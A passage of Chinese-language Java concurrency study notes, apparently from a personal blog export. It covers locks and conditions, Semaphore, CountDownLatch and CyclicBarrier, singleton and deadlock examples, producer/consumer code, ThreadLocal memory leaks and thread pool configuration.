<p><strong>可实现选择性通知（锁可以绑定多个条件）</strong>: <code>synchronized</code>关键字与<code>wait()</code>和<code>notify()</code>/<code>notifyAll()</code>方法相结合可以实现等待/通知机制。<code>ReentrantLock</code>类当然也可以实现，但是需要借助于<code>Condition</code>接口与<code>newCondition()</code>方法。</p>
</li>
</ul>
<h2 id="4-3-条件变量">4.3 条件变量</h2>
<blockquote>
<p>线程进入临界区，但需要某一条件满足才可以执行。通过条件变量管理获得一个锁但不能做有用工作的线程。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Condition cond;</span></span><br><span class="line">Lock lock=<span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();  </span><br><span class="line">Condition cond= lock.newCondition();</span><br><span class="line"><span class="comment">//将线程放入条件的等待集中，会释放锁</span></span><br><span class="line"><span class="keyword">while</span>(!(ok to proceed))</span><br><span class="line">	cond.await(); </span><br><span class="line">	</span><br><span class="line">cond.signalAll();</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除等待集中某个线程的阻塞状态</span></span><br><span class="line">cond.signal();</span><br></pre></td></tr></table></figure>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mu.<span class="keyword">Lock</span>()</span><br><span class="line">// <span class="keyword">do</span> something that might affect the condition</span><br><span class="line">cond.Broadcast()</span><br><span class="line">mu.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">----</span></span><br><span class="line"></span><br><span class="line">mu.<span class="keyword">Lock</span>()</span><br><span class="line"><span class="keyword">while</span> condition == <span class="keyword">false</span> &#123;</span><br><span class="line">	cond.Wait()</span><br><span class="line">&#125;</span><br><span class="line">// now condition <span class="keyword">is</span> <span class="keyword">true</span>, <span class="keyword">and</span> we have the <span class="keyword">lock</span></span><br><span class="line">mu.Unlock()</span><br></pre></td></tr></table></figure>
<h2 id="4-4-Semaphore-信号量">4.4 Semaphore(信号量)</h2>
<p><code>synchronized</code> 和 <code>ReentrantLock</code> 都是一次只允许一个线程访问某个资源，而<code>Semaphore</code>(信号量)可以用来控制同时访问特定资源的线程数量。</p>
<p><code>Semaphore</code> 是共享锁的一种实现，它默认构造 AQS 的 <code>state</code> 值为 <code>permits</code>，你可以将 <code>permits</code> 的值理解为许可证的数量，只有拿到许可证的线程才能执行。</p>
<p>调用<code>semaphore.acquire()</code> ，线程尝试获取许可证，如果 <code>state &gt;= 0</code> 的话，则表示可以获取成功。如果获取成功的话，使用 CAS 操作去修改 <code>state</code> 的值 <code>state=state-1</code>。如果 <code>state&lt;0</code> 的话，则表示许可证数量不足。此时会创建一个 Node 节点加入阻塞队列，挂起当前线程。</p>
<h2 id="4-5-CountDownLatch">4.5 CountDownLatch</h2>
<blockquote>
<p><code>CountDownLatch</code> 允许 <code>count</code> 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。</p>
<p><code>CountDownLatch</code> 是一次性的，计数器的值只能在构造方法中初始化一次，之后没有任何机制再次对其设置值，当 <code>CountDownLatch</code> 使用完毕后，它不能再次被使用。</p>
</blockquote>
<p><code>CountDownLatch</code> 是共享锁的一种实现,它默认构造 AQS 的 <code>state</code> 值为 <code>count</code>。当线程使用 <code>countDown()</code> 方法时,其实使用了<code>tryReleaseShared</code>方法以 CAS 的操作来减少 <code>state</code>,直至 <code>state</code> 为 0 。当调用 <code>await()</code> 方法的时候，如果 <code>state</code> 不为 0，那就证明任务还没有执行完毕，<code>await()</code> 方法就会一直阻塞，也就是说 <code>await()</code> 方法之后的语句不会被执行。直到<code>count</code> 个线程调用了<code>countDown()</code>使 state 值被减为 0，或者调用<code>await()</code>的线程被中断，该线程才会从阻塞中被唤醒，<code>await()</code> 方法之后的语句得到执行。</p>
<h2 id="4-6-CyclicBarrier">4.6 CyclicBarrier</h2>
<p><code>CyclicBarrier</code> 和 <code>CountDownLatch</code> 非常类似，它也可以实现线程间的技术等待，但是它的功能比 <code>CountDownLatch</code> 更加复杂和强大。主要应用场景和 <code>CountDownLatch</code> 类似。</p>
<blockquote>
<p><code>CountDownLatch</code> 的实现是基于 AQS 的，而 <code>CycliBarrier</code> 是基于 <code>ReentrantLock</code>(<code>ReentrantLock</code> 也属于 AQS 同步器)和 <code>Condition</code> 的。</p>
</blockquote>
<p><code>CyclicBarrier</code> 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是：让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。</p>
<p><code>CyclicBarrier</code> 内部通过一个 <code>count</code> 变量作为计数器，<code>count</code> 的初始值为 <code>parties</code> 属性的初始化值，每当一个线程到了栅栏这里了，那么就将计数器减 1。如果 count 值为 0 了，表示这是这一代最后一个线程到达栅栏，就尝试执行我们构造方法中输入的任务。</p>
<h1>5 Future、Runnable、Callable</h1>
<h2 id="5-1-Runnable、Callable">5.1 Runnable、Callable</h2>
<p><strong><code>Runnable</code> 接口</strong>不会返回结果或抛出检查异常，但是 <strong><code>Callable</code> 接口</strong>可以。工具类 <code>Executors</code> 可以实现将 <code>Runnable</code> 对象转换成 <code>Callable</code> 对象。（<code>Executors.callable(Runnable task)</code> 或 <code>Executors.callable(Runnable task, Object result)</code>）。</p>
<p><code>Runnable.java</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">@FunctionalInterface</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">Runnable</span> &#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 被线程执行，没有返回值也无法抛出异常</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Callable.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Callable</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算结果，或在无法这样做时抛出异常。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 计算得出的结果</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> 如果无法计算结果，则抛出异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    V <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>6 Java并发容器</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>ConcurrentHashMap</code></strong> : 线程安全的 <code>HashMap</code></p>
</li>
<li class="lvl-2">
<p><strong><code>CopyOnWriteArrayList</code></strong> : 线程安全的 <code>List</code>，在读多写少的场合性能非常好，远远好于 <code>Vector</code>。</p>
</li>
<li class="lvl-2">
<p><strong><code>ConcurrentLinkedQueue</code></strong> : 高效的并发队列，使用链表实现。可以看做一个线程安全的 <code>LinkedList</code>，这是一个非阻塞队列。</p>
</li>
<li class="lvl-2">
<p><strong><code>BlockingQueue</code></strong> : 这是一个接口，JDK 内部通过链表、数组等方式实现了这个接口。表示阻塞队列，非常适合用于作为数据共享的通道。</p>
</li>
<li class="lvl-2">
<p><strong><code>ConcurrentSkipListMap</code></strong> : 跳表的实现。这是一个 Map，使用跳表的数据结构进行快速查找。</p>
</li>
</ul>
<h2 id="6-1-BlockingQueue">6.1 BlockingQueue</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>ArrayBlockingQueue</p>
</li>
<li class="lvl-2">
<p>LinkedBlockingQueue</p>
</li>
<li class="lvl-2">
<p>PriorityBlockingQueue</p>
</li>
</ul>
<h1>7 总结</h1>
<ol>
<li class="lvl-3">
<p>线程有几种状态</p>
</li>
<li class="lvl-3">
<p>synchronized的锁升级</p>
</li>
<li class="lvl-3">
<p>CAS实现</p>
</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/05/13/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java(0)%EF%BC%9A%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1>1 单例模式</h1>
<p><strong>双重校验锁实现对象单例（线程安全）</strong>：</p>
<blockquote>
<p>volatile禁止指令重排序</p>
<ul class="lvl-1">
<li class="lvl-2">分配内存</li>
<li class="lvl-2">对象初始化</li>
<li class="lvl-2">设置对象引用</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton uniqueInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="comment">//先判断对象是否已经实例过，没有实例化过才进入加锁代码</span></span><br><span class="line">        <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//类对象加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uniqueInstance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>uniqueInstance</code> 采用 <code>volatile</code> 关键字修饰也是很有必要的， <code>uniqueInstance = new Singleton();</code> 这段代码其实是分为三步执行：</p>
<ol>
<li class="lvl-3">
<p>为 <code>uniqueInstance</code> 分配内存空间</p>
</li>
<li class="lvl-3">
<p>初始化 <code>uniqueInstance</code></p>
</li>
<li class="lvl-3">
<p>将 <code>uniqueInstance</code> 指向分配的内存地址</p>
</li>
</ol>
<h1>2 模拟死锁</h1>
<h2 id="2-1-线程死锁">2.1 线程死锁</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object a=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object b=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源a&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread()+<span class="string">&quot;请求资源b&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (b)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源b&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;线程1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (b)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源b&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread()+<span class="string">&quot;请求资源a&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (a)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread()+ <span class="string">&quot;获得资源a&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;线程2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2-数据库事务死锁">2.2 数据库事务死锁</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 事务1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- SQL1更新id为1的</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> age <span class="operator">=</span> <span class="number">1</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- SQL2更新id为2的</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> age <span class="operator">=</span> <span class="number">2</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 事务2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- SQL1更新id为2的</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> age <span class="operator">=</span> <span class="number">3</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="comment">-- SQL2更新id为1的</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> age <span class="operator">=</span> <span class="number">4</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/ibigboy/p/16202718.html">面试官：请用SQL模拟一个死锁 - 问北 - 博客园 (cnblogs.com)</a></p>
<h1>3 生产者、消费者模型</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Integer&gt; queue;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(BlockingQueue&lt;Integer&gt; queue)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.queue = queue;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> produce(); <span class="comment">// 生产数据</span></span><br><span class="line">                queue.put(value); <span class="comment">// 将数据放入队列</span></span><br><span class="line">                Thread.sleep(<span class="number">1000</span>); <span class="comment">// 模拟生产过程</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">produce</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 生产过程</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Integer&gt; queue;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(BlockingQueue&lt;Integer&gt; queue)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.queue = queue;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> queue.take(); <span class="comment">// 从队列中取出数据</span></span><br><span class="line">                consume(value); <span class="comment">// 消费数据</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="comment">// 消费过程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Java并发(2)：ThreadLocal、线程池</title>
    <url>/2024/05/15/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java%E5%B9%B6%E5%8F%91(2)%EF%BC%9AThreadLocal%E3%80%81%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h1>1 线程局部变量(ThreadLocal)</h1>
<blockquote>
<p>ThreadLocal的实现依赖于Thread类中的一个ThreadLocalMap字段，这是一个存储ThreadLocal变量本身和对应值的映射。每个线程都有自己的ThreadLocalMap实例，用于存储该线程所持有的所有ThreadLocal变量的值。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SimpleDateFormat dateFormat=<span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd HHmm&quot;</span>);</span><br><span class="line">String dateStamp=dateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; formatter = ThreadLocal.withInitial(</span><br><span class="line">	() -&gt; <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd HHmm&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; formatter = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;SimpleDateFormat&gt;()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> SimpleDateFormat <span class="title function_">initialValue</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd HHmm&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">String dateStamp=formatter.get().format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="1-1-内存泄漏">1.1 内存泄漏</h2>
<p><code>ThreadLocalMap</code> 中使用的 key 为 <code>ThreadLocal</code> 的弱引用，而 value 是强引用。所以，如果 <code>ThreadLocal</code> 没有被外部强引用的情况下，在垃圾回收的时候，key 会被清理掉，而 value 不会被清理掉。</p>
<p>这样一来，<code>ThreadLocalMap</code> 中就会出现 key 为 null 的 Entry。假如我们不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。<code>ThreadLocalMap</code> 实现中已经考虑了这种情况，在调用 <code>set()</code>、<code>get()</code>、<code>remove()</code> 方法的时候，会清理掉 key 为 null 的记录。使用完 <code>ThreadLocal</code>方法后最好手动调用<code>remove()</code>方法</p>
<p>当一个线程结束时，其ThreadLocalMap也会随之销毁，但是ThreadLocal对象本身不会立即被垃圾回收，直到没有其他引用指向它为止。因此，在使用ThreadLocal时需要注意，如果不显式调用remove()方法，或者线程结束时未正确清理ThreadLocal变量，可能会导致内存泄漏，因为ThreadLocalMap会持续持有ThreadLocal变量的引用，即使这些变量不再被其他地方引用。因此，实际应用中需要在使用完ThreadLocal变量后调用remove()方法释放资源。</p>
<div class="danger">
<p><em>内存泄露</em></p>
</div>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ThreadLocalMap</code>使用<code>ThreadLocal</code>的<strong>弱引用</strong>作为<code>key</code>，当<code>ThreadLocal</code>变量被手动设置为<code>null</code>，即一个<code>ThreadLocal</code>没有外部强引用来引用它，当系统GC时，<code>ThreadLocal</code>一定会被回收。这样的话，<code>ThreadLocalMap</code>中就会出现<code>key</code>为<code>null</code>的<code>Entry</code>，就没有办法访问这些<code>key</code>为<code>null</code>的<code>Entry</code>的<code>value</code>，如果当前线程再迟迟不结束的话(比如线程池的核心线程)，这些<code>key</code>为<code>null</code>的<code>Entry</code>的<code>value</code>就会一直存在一条强引用链：Thread变量 -&gt; Thread对象 -&gt; ThreaLocalMap -&gt; Entry -&gt; value -&gt; Object 永远无法回收，造成内存泄漏。</p>
</li>
<li class="lvl-2">
<p>线程池的核心线程会被复用，如果在一个线程中使用了<code>ThreadLocal</code>，并且没有正确清理，当下次这个线程被复用执行其他任务时，可能会得到上一次遗留下来的数据，从而导致错误的结果。</p>
</li>
</ul>
<h2 id="1-2-引用类型">1.2 引用类型</h2>
<p><strong>1．强引用（StrongReference）</strong><br>
当内存空间不足，Java 虚拟机抛出 OutOfMemoryError 错误，使程序异常终止</p>
<p><strong>2．软引用（SoftReference）</strong><br>
可有可无，如果内存空间足够，垃圾回收器就不会回收它，如果<mark>内存空间不足，就会回收这些对象的内存</mark>。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p>
<p><strong>3．弱引用（WeakReference）</strong><br>
可有可无，弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。</p>
<p><strong>4．虚引用（PhantomReference）</strong><br>
虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。<strong>虚引用主要用来跟踪对象被垃圾回收的活动</strong>。</p>
<p>虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。</p>
<p>弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java 虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p>
<h1>2 线程池</h1>
<blockquote>
<p>池化技术，线程池、数据库连接池、HTTP 连接池等等都是对这个思想的应用。池化技术的思想主要是为了减少每次获取资源的消耗，提高对资源的利用率。线程池是管理一系列线程的资源池。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>降低资源消耗</strong>。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。</p>
</li>
<li class="lvl-2">
<p><strong>提高响应速度</strong>。当任务到达时，任务可以不需要等到线程创建就能立即执行。</p>
</li>
<li class="lvl-2">
<p><strong>提高线程的可管理性</strong>。线程是稀缺资源，如果无限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一的分配，调优和监控</p>
</li>
</ul>
<h2 id="2-1-创建线程池">2.1 创建线程池</h2>
<p><strong>方式一：通过<code>ThreadPoolExecutor</code>构造函数来创建（推荐）。</strong><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405151608044.png" alt="image.png"></p>
<p><strong>方式二：通过 <code>Executor</code> 框架的工具类 <code>Executors</code> 来创建。</strong><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405151609702.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>FixedThreadPool</code>：固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。</p>
</li>
<li class="lvl-2">
<p><code>SingleThreadExecutor</code>： 只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。</p>
</li>
<li class="lvl-2">
<p><code>CachedThreadPool</code>： 可根据实际情况调整线程数量的线程池。线程池的线程数量不确定，但若有空闲线程可以复用，则会优先使用可复用的线程。若所有线程均在工作，又有新的任务提交，则会创建新的线程处理任务。所有线程在当前任务执行完毕后，将返回线程池进行复用。</p>
</li>
<li class="lvl-2">
<p><code>ScheduledThreadPool</code>：给定的延迟后运行任务或者定期执行任务的线程池。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>newCachedThreadPool</td>
<td>必要时创建新线程，空闲线程保留60秒</td>
<td></td>
</tr>
<tr>
<td>newFixedThreadPool</td>
<td>包含固定数量线程，空闲线程保留</td>
<td>LinkedBlockingQueue</td>
</tr>
<tr>
<td>newSingleThreadExecutor</td>
<td>只有一个线程</td>
<td>LinkedBlockingQueue</td>
</tr>
<tr>
<td>预定执行</td>
<td></td>
<td></td>
</tr>
<tr>
<td>newScheduledThreadPool</td>
<td>用于预定执行而构建的固定线程池</td>
<td></td>
</tr>
<tr>
<td>newSingleThreadSccheduledExecutor</td>
<td>用于预定执行而构建的单线程池</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>Executors</code> 返回线程池对象的弊端如下：</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>FixedThreadPool</code> 和 <code>SingleThreadExecutor</code>:使用的是无界的 <code>LinkedBlockingQueue</code>，任务队列最大长度为 <code>Integer.MAX_VALUE</code>,可能堆积大量的请求，从而导致 OOM。</p>
</li>
<li class="lvl-2">
<p><code>CachedThreadPool</code>:使用的是同步队列 <code>SynchronousQueue</code>, 允许创建的线程数量为 <code>Integer.MAX_VALUE</code> ，如果任务数量过多且执行速度较慢，可能会创建大量的线程，从而导致 OOM。</p>
</li>
<li class="lvl-2">
<p><code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code>:使用的无界的延迟阻塞队列<code>DelayedWorkQueue</code>，任务队列最大长度为 <code>Integer.MAX_VALUE</code>,可能堆积大量的请求，从而导致 OOM。</p>
</li>
</ul>
<h2 id="2-2-线程池参数">2.2 线程池参数</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> corePoolSize,<span class="comment">//线程池的核心线程数量 </span></span><br><span class="line"><span class="type">int</span> maximumPoolSize,<span class="comment">//线程池的最大线程数 </span></span><br><span class="line"><span class="type">long</span> keepAliveTime,<span class="comment">//当线程数大于核心线程数时，多余的空闲线程存活的最长时间 </span></span><br><span class="line">TimeUnit unit,<span class="comment">//时间单位 </span></span><br><span class="line">BlockingQueue&lt;Runnable&gt; workQueue,<span class="comment">//任务队列，用来储存等待执行任务的队列 </span></span><br><span class="line">ThreadFactory threadFactory,<span class="comment">//线程工厂，用来创建线程，一般默认即可 </span></span><br><span class="line">RejectedExecutionHandler handler<span class="comment">//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>corePoolSize（核心线程数）：这是线程池的基本大小，即线程池中始终保持的线程数量，不受空闲时间的影响。当有新任务提交时，如果线程池中的线程数小于corePoolSize，即便存在空闲线程，线程池也会创建一个新线程来执行任务。</p>
</li>
<li class="lvl-2">
<p>maximumPoolSize（最大线程数）：线程池允许创建的最大线程数量。当线程池中的线程数超过corePoolSize，但小于maximumPoolSize时，只有在队列满的情况下，才会创建新的线程来处理任务。</p>
</li>
<li class="lvl-2">
<p>keepAliveTime（空闲线程存活时间）：当线程池中的线程数超过corePoolSize时，多余的线程在空闲时间超过keepAliveTime后会被销毁，直到线程池中的线程数不超过corePoolSize。这有助于在系统空闲时节省资源。</p>
</li>
<li class="lvl-2">
